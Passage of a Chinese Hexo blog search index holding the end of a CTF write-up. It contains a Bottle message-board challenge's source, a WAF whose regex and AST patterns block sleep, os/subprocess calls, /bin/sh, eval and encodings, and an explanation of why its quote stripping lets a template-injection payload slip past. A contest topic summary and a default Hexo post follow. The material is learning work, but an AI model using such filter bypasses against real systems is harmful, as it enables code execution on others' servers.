class="string">f&quot;&quot;&quot;&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">    &lt;html lang=&quot;zh&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;head&gt;</span></span><br><span class="line"><span class="string">        &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;title&gt;简约留言板&lt;/title&gt;</span></span><br><span class="line"><span class="string">        &lt;link href=&quot;https://cdn.bootcdn.net/ajax/libs/twitter-bootstrap/5.1.3/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span></span><br><span class="line"><span class="string">         &lt;style&gt;</span></span><br><span class="line"><span class="string">            :root &#123;&#123;</span></span><br><span class="line"><span class="string">                --primary-color: #4a90e2;</span></span><br><span class="line"><span class="string">                --hover-color: #357abd;</span></span><br><span class="line"><span class="string">                --background-color: #f8f9fa;</span></span><br><span class="line"><span class="string">                --card-background: #ffffff;</span></span><br><span class="line"><span class="string">                --shadow-color: rgba(0, 0, 0, 0.1);</span></span><br><span class="line"><span class="string">            &#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            body &#123;&#123;</span></span><br><span class="line"><span class="string">                background: var(--background-color);</span></span><br><span class="line"><span class="string">                min-height: 100vh;</span></span><br><span class="line"><span class="string">                padding: 2rem 0;</span></span><br><span class="line"><span class="string">                font-family: &#x27;Segoe UI&#x27;, Tahoma, Geneva, Verdana, sans-serif;</span></span><br><span class="line"><span class="string">            &#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            .container &#123;&#123;</span></span><br><span class="line"><span class="string">                max-width: 800px;</span></span><br><span class="line"><span class="string">                background: var(--card-background);</span></span><br><span class="line"><span class="string">                border-radius: 15px;</span></span><br><span class="line"><span class="string">                box-shadow: 0 4px 6px var(--shadow-color);</span></span><br><span class="line"><span class="string">                padding: 2rem;</span></span><br><span class="line"><span class="string">                margin-top: 2rem;</span></span><br><span class="line"><span class="string">                animation: fadeIn 0.5s ease-in-out;</span></span><br><span class="line"><span class="string">            &#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            @keyframes fadeIn &#123;&#123;</span></span><br><span class="line"><span class="string">                from &#123;&#123; opacity: 0; transform: translateY(20px); &#125;&#125;</span></span><br><span class="line"><span class="string">                to &#123;&#123; opacity: 1; transform: translateY(0); &#125;&#125;</span></span><br><span class="line"><span class="string">            &#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            .message-card &#123;&#123;</span></span><br><span class="line"><span class="string">                background: var(--card-background);</span></span><br><span class="line"><span class="string">                border-radius: 10px;</span></span><br><span class="line"><span class="string">                padding: 1.5rem;</span></span><br><span class="line"><span class="string">                margin: 1rem 0;</span></span><br><span class="line"><span class="string">                transition: all 0.3s ease;</span></span><br><span class="line"><span class="string">                border-left: 4px solid var(--primary-color);</span></span><br><span class="line"><span class="string">                box-shadow: 0 2px 4px var(--shadow-color);</span></span><br><span class="line"><span class="string">            &#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            .message-card:hover &#123;&#123;</span></span><br><span class="line"><span class="string">                transform: translateX(10px);</span></span><br><span class="line"><span class="string">                box-shadow: 0 4px 8px var(--shadow-color);</span></span><br><span class="line"><span class="string">            &#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            .message-content &#123;&#123;</span></span><br><span class="line"><span class="string">                font-size: 1.1rem;</span></span><br><span class="line"><span class="string">                color: #333;</span></span><br><span class="line"><span class="string">                line-height: 1.6;</span></span><br><span class="line"><span class="string">                margin-bottom: 0.5rem;</span></span><br><span class="line"><span class="string">            &#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            .message-time &#123;&#123;</span></span><br><span class="line"><span class="string">                color: #6c757d;</span></span><br><span class="line"><span class="string">                font-size: 0.9rem;</span></span><br><span class="line"><span class="string">                display: block;</span></span><br><span class="line"><span class="string">                margin-top: 0.5rem;</span></span><br><span class="line"><span class="string">            &#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            textarea &#123;&#123;</span></span><br><span class="line"><span class="string">                width: 100%;</span></span><br><span class="line"><span class="string">                height: 120px;</span></span><br><span class="line"><span class="string">                padding: 1rem;</span></span><br><span class="line"><span class="string">                border: 2px solid #e9ecef;</span></span><br><span class="line"><span class="string">                border-radius: 10px;</span></span><br><span class="line"><span class="string">                resize: vertical;</span></span><br><span class="line"><span class="string">                font-size: 1rem;</span></span><br><span class="line"><span class="string">                transition: border-color 0.3s ease;</span></span><br><span class="line"><span class="string">            &#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            textarea:focus &#123;&#123;</span></span><br><span class="line"><span class="string">                border-color: var(--primary-color);</span></span><br><span class="line"><span class="string">                outline: none;</span></span><br><span class="line"><span class="string">                box-shadow: 0 0 0 3px rgba(74, 144, 226, 0.1);</span></span><br><span class="line"><span class="string">            &#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            .btn-custom &#123;&#123;</span></span><br><span class="line"><span class="string">                background: var(--primary-color);</span></span><br><span class="line"><span class="string">                color: white;</span></span><br><span class="line"><span class="string">                padding: 0.8rem 2rem;</span></span><br><span class="line"><span class="string">                border-radius: 10px;</span></span><br><span class="line"><span class="string">                border: none;</span></span><br><span class="line"><span class="string">                transition: all 0.3s ease;</span></span><br><span class="line"><span class="string">                font-weight: 500;</span></span><br><span class="line"><span class="string">                text-transform: uppercase;</span></span><br><span class="line"><span class="string">                letter-spacing: 0.05rem;</span></span><br><span class="line"><span class="string">            &#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            .btn-custom:hover &#123;&#123;</span></span><br><span class="line"><span class="string">                background: var(--hover-color);</span></span><br><span class="line"><span class="string">                transform: translateY(-2px);</span></span><br><span class="line"><span class="string">                box-shadow: 0 4px 8px var(--shadow-color);</span></span><br><span class="line"><span class="string">            &#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            h1 &#123;&#123;</span></span><br><span class="line"><span class="string">                color: var(--primary-color);</span></span><br><span class="line"><span class="string">                text-align: center;</span></span><br><span class="line"><span class="string">                margin-bottom: 2rem;</span></span><br><span class="line"><span class="string">                font-weight: 600;</span></span><br><span class="line"><span class="string">                font-size: 2.5rem;</span></span><br><span class="line"><span class="string">                text-shadow: 2px 2px 4px var(--shadow-color);</span></span><br><span class="line"><span class="string">            &#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            .btn-danger &#123;&#123;</span></span><br><span class="line"><span class="string">                transition: all 0.3s ease;</span></span><br><span class="line"><span class="string">                padding: 0.6rem 1.5rem;</span></span><br><span class="line"><span class="string">                border-radius: 10px;</span></span><br><span class="line"><span class="string">                text-transform: uppercase;</span></span><br><span class="line"><span class="string">                letter-spacing: 0.05rem;</span></span><br><span class="line"><span class="string">            &#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            .btn-danger:hover &#123;&#123;</span></span><br><span class="line"><span class="string">                transform: translateY(-2px);</span></span><br><span class="line"><span class="string">                box-shadow: 0 4px 8px var(--shadow-color);</span></span><br><span class="line"><span class="string">            &#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            .text-muted &#123;&#123;</span></span><br><span class="line"><span class="string">                font-style: italic;</span></span><br><span class="line"><span class="string">                color: #6c757d !important;</span></span><br><span class="line"><span class="string">            &#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            @media (max-width: 576px) &#123;&#123;</span></span><br><span class="line"><span class="string">                h1 &#123;&#123;</span></span><br><span class="line"><span class="string">                    font-size: 2rem;</span></span><br><span class="line"><span class="string">                &#125;&#125;</span></span><br><span class="line"><span class="string">                .container &#123;&#123;</span></span><br><span class="line"><span class="string">                    padding: 1.5rem;</span></span><br><span class="line"><span class="string">                &#125;&#125;</span></span><br><span class="line"><span class="string">                .message-card &#123;&#123;</span></span><br><span class="line"><span class="string">                    padding: 1rem;</span></span><br><span class="line"><span class="string">                &#125;&#125;</span></span><br><span class="line"><span class="string">            &#125;&#125;</span></span><br><span class="line"><span class="string">        &lt;/style&gt;</span></span><br><span class="line"><span class="string">    &lt;/head&gt;</span></span><br><span class="line"><span class="string">    &lt;body&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;d-flex justify-content-between align-items-center mb-4&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;h1 class=&quot;mb-0&quot;&gt;📝 简约留言板&lt;/h1&gt;</span></span><br><span class="line"><span class="string">                &lt;a </span></span><br><span class="line"><span class="string">                    href=&quot;/Clean&quot; </span></span><br><span class="line"><span class="string">                    class=&quot;btn btn-danger&quot;</span></span><br><span class="line"><span class="string">                    onclick=&quot;return confirm(&#x27;确定要清空所有留言吗？此操作不可恢复！&#x27;)&quot;</span></span><br><span class="line"><span class="string">                &gt;</span></span><br><span class="line"><span class="string">                    🗑️ 一键清理</span></span><br><span class="line"><span class="string">                &lt;/a&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            &lt;form action=&quot;/submit&quot; method=&quot;post&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;textarea </span></span><br><span class="line"><span class="string">                    name=&quot;message&quot; </span></span><br><span class="line"><span class="string">                    placeholder=&quot;输入payload暴打出题人&quot;</span></span><br><span class="line"><span class="string">                    required</span></span><br><span class="line"><span class="string">                &gt;&lt;/textarea&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;d-grid gap-2&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;button type=&quot;submit&quot; class=&quot;btn-custom&quot;&gt;发布留言&lt;/button&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/form&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            &lt;div class=&quot;message-list mt-4&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;d-flex justify-content-between align-items-center mb-3&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;h4 class=&quot;mb-0&quot;&gt;最新留言（<span class="subst">&#123;<span class="built_in">len</span>(message)&#125;</span>条）&lt;/h4&gt;</span></span><br><span class="line"><span class="string">                    <span class="subst">&#123;<span class="string">f&#x27;&lt;small class=&quot;text-muted&quot;&gt;点击右侧清理按钮可清空列表&lt;/small&gt;&#x27;</span> <span class="keyword">if</span> message <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span>&#125;</span></span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">                <span class="subst">&#123;message_items&#125;</span></span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/body&gt;</span></span><br><span class="line"><span class="string">    &lt;/html&gt;&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> board</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">message</span>):</span><br><span class="line">    <span class="comment"># 保留原有基础过滤</span></span><br><span class="line">    filtered = message.replace(<span class="string">&quot;&#123;&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&#125;&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 预处理混淆特征</span></span><br><span class="line">    cleaned = re.sub(<span class="string">r&#x27;[\&#x27;&quot;`\\]&#x27;</span>, <span class="string">&#x27;&#x27;</span>, filtered)  <span class="comment"># 清除引号和反斜杠</span></span><br><span class="line">    cleaned = re.sub(<span class="string">r&#x27;/\*.*?\*/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, cleaned)  <span class="comment"># 去除注释干扰</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 增强型sleep检测正则（覆盖50+种变形）</span></span><br><span class="line">    sleep_pattern = <span class="string">r&#x27;&#x27;&#x27;(?xi)</span></span><br><span class="line"><span class="string">(</span></span><br><span class="line"><span class="string">    # 基础关键词变形检测</span></span><br><span class="line"><span class="string">    \b</span></span><br><span class="line"><span class="string">    s[\s\-_]*l[\s\-_]*e[\s\-_]*e[\s\-_]*p+  # 允许分隔符：s-l-e-e-p</span></span><br><span class="line"><span class="string">    | s(?:l3|1|i)(?:3|e)(?:3|e)p            # 字符替换：sl33p/s1eep</span></span><br><span class="line"><span class="string">    | (?:sl+e+p|slee+p|sle&#123;2,&#125;p)            # 重复字符：sleeeeep</span></span><br><span class="line"><span class="string">    | (?:s+|5+)(?:l+|1+)(?:e+|3+)&#123;2&#125;(?:p+|9+)  # 全替换变体：5l33p9</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    # 模块调用检测（含动态导入）</span></span><br><span class="line"><span class="string">    | (?:time|os|subprocess|ctypes|signal)\s*\.\s*(?:sleep|system|wait)\s*\(.*?\)</span></span><br><span class="line"><span class="string">    | __import__\s*\(\s*[\&#x27;&quot;](?:time|os)[\&#x27;&quot;]\s*\)\.\s*\w+\s*\(.*?\)</span></span><br><span class="line"><span class="string">    | getattr\s*\(\s*\w+\s*,\s*[\&#x27;&quot;]sleep[\&#x27;&quot;]\s*\)\s*\(.*?\)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    # 编码检测（Hex/Base64/URL/Unicode）</span></span><br><span class="line"><span class="string">    | (?:\\x73|%73|%u0073)(?:\\x6c|%6c|%u006c)(?:\\x65|%65|%u0065)&#123;2&#125;(?:\\x70|%70|%u0070)  # HEX/URL编码</span></span><br><span class="line"><span class="string">    | YWZ0ZXI=.*?(?:c2xlZXA=|czNlM3A=)  # Base64多层编码匹配（sleep的常见编码）</span></span><br><span class="line"><span class="string">    | %s(l|1)(e|3)&#123;2&#125;p%                # 混合编码</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    # 动态执行检测（修复括号闭合）</span></span><br><span class="line"><span class="string">    | (?:eval|exec|compile)\s*\(.*?(?:sl(?:ee|3&#123;2&#125;)p|[&#x27;&quot;]\\x73\\x6c\\x65\\x65\\x70).*?\)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    # 系统调用检测（Linux/Windows）</span></span><br><span class="line"><span class="string">    | /bin/(?:sleep|sh)\b</span></span><br><span class="line"><span class="string">    | (?:cmd\.exe\s+/c|powershell)\s+.*?(?:Start-Sleep|timeout)\b</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    # 混淆写法</span></span><br><span class="line"><span class="string">    | s\/leep\b     # 路径混淆</span></span><br><span class="line"><span class="string">    | s\.\*leep      # 通配符干扰</span></span><br><span class="line"><span class="string">    | s&lt;!--leep      # 注释干扰</span></span><br><span class="line"><span class="string">    | s\0leep        # 空字节干扰</span></span><br><span class="line"><span class="string">    | base64</span></span><br><span class="line"><span class="string">    | base32</span></span><br><span class="line"><span class="string">    | decode</span></span><br><span class="line"><span class="string">    | \+</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> re.search(sleep_pattern, cleaned):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;检测到非法时间操作！&quot;</span></span><br><span class="line">    <span class="keyword">if</span> re.search(<span class="string">&#x27;eval&#x27;</span>, cleaned):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;eval会让我报错&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># AST语法树检测增强</span></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">SleepDetector</span>(ast.NodeVisitor):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">visit_Call</span>(<span class="params">self, node</span>):</span><br><span class="line">            <span class="comment"># 检测直接调用 sleep()</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">hasattr</span>(node.func, <span class="string">&#x27;id&#x27;</span>) <span class="keyword">and</span> <span class="string">&#x27;sleep&#x27;</span> <span class="keyword">in</span> node.func.<span class="built_in">id</span>.lower():</span><br><span class="line">                <span class="keyword">raise</span> ValueError</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 检测 time.sleep() 等模块调用</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(node.func, ast.Attribute):</span><br><span class="line">                <span class="keyword">if</span> node.func.attr == <span class="string">&#x27;sleep&#x27;</span> <span class="keyword">and</span> \</span><br><span class="line">                        <span class="built_in">isinstance</span>(node.func.value, ast.Name) <span class="keyword">and</span> \</span><br><span class="line">                        node.func.value.<span class="built_in">id</span> <span class="keyword">in</span> (<span class="string">&#x27;time&#x27;</span>, <span class="string">&#x27;os&#x27;</span>):</span><br><span class="line">                    <span class="keyword">raise</span> ValueError</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">self</span>.generic_visit(node)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 保留原有语法检测</span></span><br><span class="line">        tree = ast.parse(filtered)</span><br><span class="line">        SleepDetector().visit(tree)</span><br><span class="line">    <span class="keyword">except</span> (SyntaxError, ValueError) <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># 保持原有错误提示</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;检测某种语法错误，防留言板报错系统启动:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(e)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> filtered</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> template(handle_message(messages))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/Clean&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Clean</span>():</span><br><span class="line">    <span class="keyword">global</span> messages</span><br><span class="line">    messages = []</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&lt;script&gt;window.location.href=&quot;/&quot;&lt;/script&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/submit&#x27;</span>, method=<span class="string">&#x27;POST&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">submit</span>():</span><br><span class="line">    message = waf(request.forms.get(<span class="string">&#x27;message&#x27;</span>))</span><br><span class="line">    messages.append(message)</span><br><span class="line">    <span class="keyword">return</span> template(handle_message(messages))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    run(app, host=<span class="string">&#x27;127.0.0.1&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>上面payload可以的原因是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cleaned = re.sub(<span class="string">r&#x27;[\&#x27;&quot;`\\]&#x27;</span>, <span class="string">&#x27;&#x27;</span>, filtered)  <span class="comment"># 清除引号和反斜杠</span></span><br><span class="line">cleaned = re.sub(<span class="string">r&#x27;/\*.*?\*/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, cleaned)  <span class="comment"># 去除注释干扰</span></span><br></pre></td></tr></table></figure><p>删除了 ‘ “。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__\s*\(\s*[    \&#x27;&quot;](?:time|os)[\&#x27;&quot;]\s*\)\.\s*\w+\s*\(.*?\)</span><br></pre></td></tr></table></figure><p>导致这里正则在匹配单双引号时出错。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>xxe 和 ssrf 现在还并没有学习，就没有做。</p><p>说一下比赛考察的知识点结构：</p><ol><li>Bottle 框架考察的 ssti模板注入 + 无回显 (Message in a Bottle 与 Message in a Bottle plus)。</li><li>flask框架考察的 ssti模板注入， flask框架与python反序列化结合的无回显注入 (upload?SSTI! 与 ezzz_pickle)。</li><li>sql注入，主要考察的sqlite框架的，这个我现在了解的还是比较少的，sqlite注入有学习的必要了 (SQL???)。</li><li>php反序列化：代码审计+原生类的利用+反序列化；代码审计+反序列化字符串逃逸+文件上传；原生类利用的反序列化，我并没有见过，做完以后，我还是了解了一下 (Popppppp 与 Escape!)。</li><li>suid 提权：代码审计+命令执行+suid提权，一定要知道如何搜索权限里面有s的命令了 (GetShell)。</li><li>任意文件读到RCE：考察的md5强碰撞+CVE-2024-2961，也可以泄露目录的其他文件比如<code>docker-entrypoint.sh</code>，可以知道flag的路径 (ez_readfile)。</li><li>文件上传：.htaccess 绕过 getimagesize (UPUPUP)。</li></ol><p>如果让我当时做的话，大部分题目都会寄。</p>]]></content>
      
      
      <categories>
          
          <category> CTFwp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFwp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/hexo-method/hello-world/"/>
      <url>/hexo-method/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p><p><a href="https://zhuanlan.zhihu.com/p/50787870">https://zhuanlan.zhihu.com/p/50787870</a></p><p><a href="https://fuguigui.github.io/hexo2/">https://fuguigui.github.io/hexo2/</a></p><p><a href="https://blog.csdn.net/sinat_37781304/article/details/82729029#t17">https://blog.csdn.net/sinat_37781304/article/details/82729029#t17</a></p><p><a href="https://blog.csdn.net/Reinhart_L/article/details/122587975">https://blog.csdn.net/Reinhart_L/article/details/122587975</a></p><p><a href="https://y4tacker.github.io/">https://y4tacker.github.io/</a></p>]]></content>
      
      
      <categories>
          
          <category> hexo method </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo 教程 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
